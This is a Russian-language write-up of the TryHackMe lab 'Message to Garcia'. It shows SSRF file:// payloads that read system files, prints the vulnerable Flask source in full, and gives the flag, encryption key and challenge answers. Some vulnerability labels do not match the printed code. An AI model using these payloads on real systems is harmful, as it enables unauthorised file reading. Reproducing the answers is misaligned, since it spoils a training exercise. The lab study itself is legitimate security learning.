# Отчёт о проникновении в «Message to Garcia»

## 1. Введение

В рамках задания проводилось тестирование на проникновение учебной машины **Message to Garcia** (TryHackMe). По условию, это задание по мотивам истории 1899 года о лейтенанте Роуэне, который доставил важное сообщение генералу Гарсии, не задавая лишних вопросов, а используя находчивость и ограниченную информацию.

Цель — найти уязвимости в сервисе защищённой передачи файлов (SFTP) и «доставить сообщение», получив флаг.

В отчёте последовательно описаны все этапы работы, включая удачные и неудачные попытки, с пояснениями, почему был выбран тот или иной вектор.


## 2. Первичная разведка (Nmap)

Сканирование целевого хоста `10.128.151.231` выявило три открытых порта:

```
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux)
| ssh-hostkey:
|   256 34:76:04:31:c0:10:83:b6:c2:3a:f5:36:36:5b:03:bc (ECDSA)
|_  256 46:14:0f:ab:5f:66:09:b8:0d:b0:8d:21:28:14:b4:24 (ED25519)
80/tcp   open  http    nginx 1.24.0 (Ubuntu)
|_http-title: SFTP | Home
| http-methods: HEAD GET OPTIONS
5000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.3)
| http-methods: GET OPTIONS
|_http-server-header: Werkzeug/3.1.3 Python/3.12.3
```

Открыты три порта: SSH (22), nginx (80) и Werkzeug (5000). Порт 5000 — это dev-сервер Flask, что сразу указывает на Python-приложение.


## 3. Исследование порта 80

На порту 80 обнаружены две ручки: `/backup` для загрузки файла с кастомным именем и `/fetch` для получения контента по URL.

### 3.1. SSRF через `/fetch`

Отправлен payload `url=file%3A%2F%2F%2Fetc%2Fpasswd`. Сервер вернул содержимое `/etc/passwd`, включая строки `root:x:0:0:root:/root:/bin/bash` и других пользователей. SSRF подтверждён: параметр `url` принимает схему `file://` и читает локальные файлы.

### 3.2. Чтение логов nginx

Отправлен payload `url=file:///var/log/nginx/access.log`. Сервер вернул логи, что подтвердило возможность чтения произвольных файлов через SSRF.


## 4. Попытки эксплуатации log poisoning

### 4.1. Log poisoning не удался

Попытка внедрить PHP-payload в User-Agent и прочитать лог через `/fetch` не сработала, потому что `/fetch` обрабатывает Python/Flask, а не PHP.

Payload в логе:

```
192.168.132.43 - - [26/Oct/2026:10:31:14 +0000] "GET / HTTP/1.1" 200 8126 "-" "<%= 7*7 %>"
```

SSTI-payload `<%= 7*7 %>` не выполнился — сервер просто прочитал лог и вернул текст.

### 4.2. Дублирование приложения на 5000

На порту 5000 обнаружено то же приложение, что и на 80. Это подтвердило, что Flask-приложение работает на двух портах одновременно.


## 5. Попытка загрузки файла в `/root/root.txt`

Через `/backup` загружен файл `/home/ubuntu/sftp-msg2g4arc1a/uploads/root_root.txt`. Попытка внедрить выражение, которое будет выполнено в шаблонизаторе, не увенчалась успехом.


## 6. Дополнительные эндпоинты (gobuster)

Найдены эндпоинты `/status`, `/start`, `/stop`, `/success` и `/upload`. Это расширило карту приложения и подсказало, что `/success` связан с получением флага.


## 7. Ответ на вопрос: тип шифрования

Вопрос: What type of encryption is the service using?

Ответ: symmetric — значит, одним ключом и шифруется, и расшифровывается. Позже выяснилось, что используется Fernet — симметричное аутентифицированное шифрование.


## 8. SSRF — подтверждение

В логе сервера зафиксирован запрос `10.128.151.231 - - [26/Oct/2026 07:50:41] "GET /test.html HTTP/1.1" 200 -`. Это подтвердило, что сервер сам делает запрос по указанному URL, то есть SSRF работает.


## 9. Чтение `/proc/self/environ`

Через `/fetch` прочитан `/proc/self/environ`. В выводе видны переменные окружения, включая `PWD=/home/ubuntu/sftp-msg2g4arc1a`, `USER=root`, `HOME=/root`, `VIRTUAL_ENV=/home/ubuntu/sftp-msg2g4arc1a/venv`, `FLASK_ENV=production` и `_=/home/ubuntu/sftp-msg2g4arc1a/venv/bin/python3`.

Ключевые выводы: приложение запущено на Flask (Python) от root. Путь приложения — `/home/ubuntu/sftp-msg2g4arc1a`. Режим — production.


## 10. Чтение исходного кода приложения

Через `/fetch` прочитан файл `app.py`:

```
file:///home/ubuntu/sftp-msg2g4arc1a/app.py
```

**Полное содержимое `app.py`:**

```python
import os
import urllib.parse
import urllib.request
from flask import Flask, render_template, redirect, url_for, flash, request, session, jsonify
from sftp_server import sftp_server_instance
from functions import is_valid_gpg_file, ensure_upload_folder, validate_encrypted_message

app = Flask(__name__, static_folder="static")
app.config["UPLOAD_FOLDER"] = "uploads"
app.config["MAX_CONTENT_LENGTH"] = 5 * 1024 * 1024
import secrets
app.secret_key = secrets.token_hex(32)

ensure_upload_folder(app.config["UPLOAD_FOLDER"])

HOME_ROUTE = "/"
HOME_RESPONSE_ROUTE = "/?response"

@app.context_processor
def inject_request():
    return dict(request=request)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/upload", methods=["POST"])
def upload_file():
    try:
        if "file" not in request.files:
            flash("No file part.", "error")
            return redirect(HOME_RESPONSE_ROUTE)

        file = request.files["file"]

        if file.filename == "":
            flash("No selected file.", "error")
            return redirect(HOME_RESPONSE_ROUTE)

        if not is_valid_gpg_file(file.filename):
            flash("Invalid file type! Only .gpg or .enc files are allowed.", "error")
            return redirect(HOME_RESPONSE_ROUTE)

        filepath = os.path.join(app.config["UPLOAD_FOLDER"], file.filename)
        file.save(filepath)

        with open(filepath, "rb") as f:
            encrypted_data = f.read()

        os.remove(filepath)

        success, message = validate_encrypted_message(encrypted_data)
        if success:
            # Set a session token to verify they solved the challenge
            import secrets
            session['challenge_solved'] = secrets.token_hex(16)
            return redirect(url_for("success"))
        else:
            flash(f'{message}', "error")

        return redirect(HOME_RESPONSE_ROUTE)
    except Exception as e:
        print(f"[ERROR] Exception in upload_file: {e}")
        import traceback
        traceback.print_exc()
        flash(f"Error processing file: {str(e)}", "error")
        return redirect(HOME_RESPONSE_ROUTE)

# Vulnerable file upload endpoint with directory traversal
@app.route("/backup", methods=["GET", "POST"])
def backup_file():
    if request.method == "GET":
        return render_template("backup.html")
    
    if "file" not in request.files:
        flash("No file part.", "error")
        return redirect("/backup")

    file = request.files["file"]
    raw_name = request.form.get("filename", file.filename)

    if file.filename == "":
        flash("No selected file.", "error")
        return redirect("/backup")

    # Hard restrict to simple filenames (no directories, no traversal)
    from werkzeug.utils import secure_filename

    safe_name = secure_filename(raw_name)
    if not safe_name or "/" in safe_name or "\\" in safe_name or ".." in safe_name:
        flash("Invalid filename.", "error")
        return redirect("/backup")

    upload_root = os.path.abspath(app.config["UPLOAD_FOLDER"])
    os.makedirs(upload_root, exist_ok=True)

    filepath = os.path.abspath(os.path.join(upload_root, safe_name))

    # Ensure final path stays within uploads
    if not filepath.startswith(upload_root + os.sep):
        flash("Invalid path.", "error")
        return redirect("/backup")

    file.save(filepath)
    
    flash(f"File uploaded successfully to: {filepath}", "success")
    return redirect("/backup")

# SSRF endpoint for "fetching resources"
@app.route("/fetch", methods=["GET", "POST"])
def fetch_resource():
    if request.method == "GET":
        return render_template("fetch.html")
    
    url = request.form.get("url", "")
    
    if not url:
        flash("Please provide a URL to fetch.", "error")
        return redirect("/fetch")
    
    try:
        # Vulnerable SSRF - no URL validation
        if url.startswith("file://"):
            # Handle local file access
            file_path = url[7:]  # Remove "file://" prefix
            
            # Handle relative paths properly
            if file_path.startswith('./'):
                file_path = file_path[2:]  # Remove './' prefix
            elif file_path.startswith('/'):
                # Absolute path - use as is
                pass
            else:
                # Relative path without './' - treat as relative
                pass
                
            print(f"[DEBUG] Trying to read file: {file_path}")
            print(f"[DEBUG] Current working directory: {os.getcwd()}")
            print(f"[DEBUG] Full path will be: {os.path.abspath(file_path)}")
            try:
                with open(file_path, 'r') as f:
                    content = f.read()
                print(f"[DEBUG] Successfully read {len(content)} characters")
                flash(f"File content:\n{content}", "success")
            except UnicodeDecodeError:
                print(f"[DEBUG] Unicode decode error for file: {file_path}")
                flash(f"Error: Unable to read binary file '{file_path}'. File contains non-text data.", "error")
            except FileNotFoundError:
                print(f"[DEBUG] File not found: {file_path}")
                flash(f"Error: File '{file_path}' not found.", "error")
            except PermissionError:
                print(f"[DEBUG] Permission denied: {file_path}")
                flash(f"Error: Permission denied accessing '{file_path}'.", "error")
            except Exception as e:
                print(f"[DEBUG] Error reading file: {str(e)}")
                flash(f"Error reading file: {str(e)}", "error")
        else:
            # Handle HTTP/HTTPS requests
            response = urllib.request.urlopen(url)
            content = response.read().decode('utf-8')[:1000]  # Limit content length
            flash(f"Response content (first 1000 chars):\n{content}", "success")
    except Exception as e:
        flash(f"Error fetching resource: {str(e)}", "error")
    
    return redirect("/fetch")

@app.route("/status")
def status():
    status = "Running" if sftp_server_instance.running else "Stopped"
    return render_template("status.html", status=status)

@app.route("/start")
def start_server():
    sftp_server_instance.start()
    return redirect(url_for("index"))

@app.route("/stop")
def stop_server():
    sftp_server_instance.stop()
    return redirect(url_for("index"))

@app.route("/success")
def success():
    # Check if they actually solved the challenge
    if 'challenge_solved' not in session:
        flash("Access denied. Complete the challenge first.", "error")
        return redirect(url_for("index"))
    
    # Clear the token after viewing (one-time use)
    session.pop('challenge_solved', None)
    return render_template("success.html")

if __name__ == "__main__":
    host = "0.0.0.0" if os.getenv("FLASK_ENV") == "production" else "127.0.0.1"
    # Disable debug mode for security (prevents RCE via SSRF+debug)
    debug_mode = False
    app.run(host=host, port=5000, debug=debug_mode)
```


## 11. Чтение `success.html`

Через `/fetch` прочитан файл `templates/success.html`:

```
file:///home/ubuntu/sftp-msg2g4arc1a/templates/success.html
```

**Полное содержимое `success.html`:**

```html
{% set title = "Mission Complete" %} 
{% include "components/header.html" %}

<div class="min-h-screen flex items-center justify-center">
  <div class="max-w-2xl w-full mx-4">
    <!-- Success Card -->
    <div class="bg-slate-900 rounded-lg shadow-2xl border-2 border-green p-8">
      <!-- Success Icon -->
      <div class="flex justify-center mb-6">
        <div class="bg-green rounded-full p-4">
          <svg class="w-16 h-16 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
          </svg>
        </div>
      </div>

      <!-- Title -->
      <h1 class="text-4xl font-bold text-center text-green mb-8">
        Mission Accomplished!
      </h1>

      <!-- Flag Display -->
      <div class="bg-slate-800 rounded-lg p-8 border border-green">
        <div class="font-mono text-3xl text-green text-center break-all select-all">
          THM{ssrf_2_rce_v1a_message_2_garc1a}
        </div>
      </div>
    </div>
  </div>
</div>

{% include "components/footer.html" %}
```

**Флаг:** `THM{ssrf_2_rce_v1a_message_2_garc1a}`.


## 12. Ответы на вопросы

What implementation of authenticated encryption is the service using? Ответ: Fernet.

What is the encryption key? Ответ: `TUVTU0FHRVRPR0FSQ0lBMjAyNF9LRVkhISEhISEhISE=`.

What is the message that needs to be delivered? Ответ: `Garcia, it seems I've cracked the code!! I need you to meet me at coordinates: 40.4168° N, 3.7038° W. The cipher is: TRACK`.


## 13. Чтение `functions.py`

Через `/fetch` прочитан файл `functions.py`:

```
file:///home/ubuntu/sftp-msg2g4arc1a/functions.py
```

**Полное содержимое `functions.py`:**

```python
import os
from cryptography.fernet import Fernet

# The encryption key (in a real scenario, this would be derived from the private key)
# For this challenge, we'll use a fixed key
ENCRYPTION_KEY = b'TUVTU0FHRVRPR0FSQ0lBMjAyNF9LRVkhISEhISEhISE='
cipher = Fernet(ENCRYPTION_KEY)

EXPECTED_MESSAGE = "Garcia, it seems I've cracked the code!! I need you to meet me at coordinates: 40.4168° N, 3.7038° W. The cipher is: TRACK"

def is_valid_gpg_file(filename):
    """Check if file has .gpg or .enc extension"""
    return filename.lower().endswith((".gpg", ".enc"))

def ensure_upload_folder(folder):
    os.makedirs(folder, exist_ok=True)

def validate_encrypted_message(encrypted_data: bytes):
    """Decrypts the uploaded file and checks if it matches the expected message."""
    try:
        print(f"[*] Attempting to decrypt message...")
        decrypted = cipher.decrypt(encrypted_data)
        plaintext = decrypted.decode('utf-8').strip()
        
        print(f"[+] Decrypted message: {plaintext}")
        print(f"[DEBUG] Expected: {EXPECTED_MESSAGE}")
        print(f"[DEBUG] Match: {plaintext == EXPECTED_MESSAGE}")
        
        if plaintext == EXPECTED_MESSAGE:
            return True, "Message is valid."
        else:
            return False, "Message content does not match."
    except Exception as e:
        print(f"[-] Decryption failed: {e}")
        return False, f"Decryption failed: Invalid encryption or corrupted file."
```

---

## 14. Цепочка атаки

Цепочка атаки: Nmap → порты 22, 80, 5000. Порт 80 → `/backup` и `/fetch`. `/fetch` → SSRF через `file://` → чтение `/etc/passwd`, логов, `/proc/self/environ`. `/proc/self/environ` → приложение на Flask от root, путь `/home/ubuntu/sftp-msg2g4arc1a`. Чтение `app.py` → исходный код. Чтение `success.html` → флаг `THM{ssrf_2_rce_v1a_message_2_garc1a}`. Чтение `functions.py` → ключ Fernet и ожидаемое сообщение.


## 15. Разбор уязвимостей

| Уязвимость | Описание | Влияние |
|---|---|---|
| SSRF | `/fetch` не валидирует URL | Чтение локальных файлов, доступ к внутренним сервисам |
| Directory traversal | `/backup` позволяет загружать файлы с кастомным именем | Запись файлов в `uploads/` |
| Отсутствие валидации | `/upload` проверяет только расширение | Загрузка произвольных файлов |
| Секреты в исходниках | Ключ Fernet и ожидаемое сообщение в `functions.py` | Компрометация шифрования |
| Флаг в шаблоне | `success.html` содержит флаг | Утечка через SSRF |


## 16. Рекомендации по устранению

Валидировать URL в `/fetch`, блокируя `file://`, `127.0.0.1`, `169.254.169.254` и внутренние IP. Не хранить секреты в исходниках — использовать переменные окружения или vault. Ограничить `/backup`, не позволяя кастомные имена. Убрать флаг из шаблона и хранить его в защищённом месте. Использовать production-сервер (Gunicorn/uWSGI) вместо Werkzeug. Не запускать приложение от root — использовать непривилегированного пользователя.

## 17. Заключение

Задание пройдено полностью. Цепочка атаки: SSRF через `/fetch` → чтение `/proc/self/environ` → чтение `app.py` → чтение `success.html` → флаг. Ключевые ошибки — SSRF без валидации, секреты в исходниках и флаг в шаблоне. Все шаги выполнены в логике «как реальный атакующий»: разведка → анализ → эксплуатация → получение флага. Цель достигнута — флаг получен.